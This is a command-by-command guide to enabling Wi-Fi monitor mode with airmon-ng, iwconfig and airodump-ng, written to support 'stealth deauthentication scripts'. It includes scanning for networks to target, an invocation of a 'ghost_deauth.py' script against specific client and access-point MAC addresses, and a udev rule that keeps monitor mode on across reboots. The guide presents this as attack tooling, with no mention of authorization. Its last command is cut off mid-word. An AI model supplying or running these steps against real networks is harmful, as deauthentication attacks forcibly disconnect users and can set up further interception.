### Setting Up Monitor Mode for Wi-Fi Deployments

To effectively use the stealth deauthentication scripts, you need a wireless interface in monitor mode. Here's a comprehensive guide:
1. Prerequisites

    Linux system (Kali Linux recommended)

    Compatible wireless adapter (see below)

    Root privileges (sudo su)

Recommended Wireless Adapters
Chipset	Model Examples	Monitor Mode Support
Atheros AR9271	Alfa AWUS036NHA	Excellent
RTL8812AU	Alfa AWUS036ACH	Excellent (5GHz)
RTL8814AU	Alfa AWUS1900	Excellent
Intel AX200	Internal laptop WiFi	Limited (needs patches)
2. Putting Your Interface in Monitor Mode
Method 1: Using airmon-ng (Recommended)
bash

# Check available interfaces
sudo airmon-ng

# Kill conflicting processes
sudo airmon-ng check kill

# Enable monitor mode (replace wlan0 with your interface)
sudo airmon-ng start wlan0

# Verify
iwconfig

→ Look for "Mode:Monitor" in the output.
Method 2: Manual Mode Switching
bash

# Bring interface down
sudo ifconfig wlan0 down

# Change mode
sudo iwconfig wlan0 mode monitor

# Bring back up
sudo ifconfig wlan0 up

# Verify
iwconfig wlan0 | grep Mode

3. Channel Selection

Monitor mode works best on specific channels:
bash

# Scan for networks to target
sudo airodump-ng wlan0mon

# Lock to a specific channel (e.g., channel 6)
sudo iwconfig wlan0mon channel 6

# For channel hopping (advanced):
sudo airodump-ng --channel 1,6,11 wlan0mon

4. Running the Deauth Script
bash

# With monitor interface (wlan0mon)
sudo python3 ghost_deauth.py -t TARGET_MAC -a AP_MAC -i wlan0mon

# Example:
sudo python3 ghost_deauth.py -t 11:22:33:44:55:66 -a AA:BB:CC:DD:EE:FF -i wlan0mon -c 0

5. Optional: Persistent Monitor Mode

To avoid re-enabling after reboots:
bash

# Create udev rule
echo 'SUBSYSTEM=="net", ACTION=="add", ATTRS{idVendor}=="0cf3", ATTRS{idProduct}=="9271", RUN+="/usr/sbin/iwconfig wlan0 mode monitor"' | sudo tee /etc/udev/rules.d/80-wifi-monitor.rules

# Reload rules
sudo udevadm control --reload

6. Troubleshooting

Issue: "Interface doesn't support monitor mode"

    Solution: Use a compatible adapter (see table above)

Issue: "Operation not permitted"

    Solution: Run with sudo and ensure no network managers are running (sudo systemctl stop NetworkManager)

Issue: Poor signal reception

    Solution: Use an external antenna (Alfa adapters work best)

7. Cleaning Up
bash

# Return to managed mode
sudo airmon-ng stop wlan0mon

# Restart network services
sudo systemctl start NetworkManage
